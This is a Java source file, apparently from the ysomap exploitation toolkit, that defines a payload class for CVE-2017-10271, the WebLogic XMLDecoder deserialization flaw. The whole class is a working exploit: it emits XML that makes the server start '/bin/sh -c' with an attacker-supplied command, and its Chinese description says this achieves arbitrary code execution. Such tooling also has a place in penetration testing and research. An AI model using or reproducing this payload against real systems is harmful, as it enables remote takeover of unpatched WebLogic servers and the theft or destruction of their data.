package ysomap.bullets.weblogic.xml;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * for CVE-2017-10271
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("使用Weblogic的XML反序列化漏洞，当前为适用于CVE-2017-10271或其他未受限制的XMLDecoder反序列化漏洞。\n" +
        "执行后，可执行任意代码")
@Dependencies({"*"})
public class WeblogicXMLRCEBullet implements Bullet<String> {

    @NotNull
    @Require(name = "cmd", detail = "command, for linux")
    public String cmd;

    @Override
    public String getObject() throws Exception {
        return "\t <java> \n" +
                "\t\t<void class=\"java.lang.ProcessBuilder\"> \n" +
                "\t\t  <array class=\"java.lang.String\" length=\"3\"> \n" +
                "\t\t\t<void index=\"0\"> \n" +
                "\t\t\t  <string>/bin/sh</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"1\"> \n" +
                "\t\t\t  <string>-c</string> \n" +
                "\t\t\t</void>  \n" +
                "\t\t\t<void index=\"2\"> \n" +
                "\t\t\t  <string>"+cmd+"</string>\n" +
                "\t\t\t</void>\n" +
                "\t\t  </array>\n" +
                "\t\t  <void method=\"start\"/> \n" +
                "\t\t</void>\n" +
                "\t  </java>";
    }
}
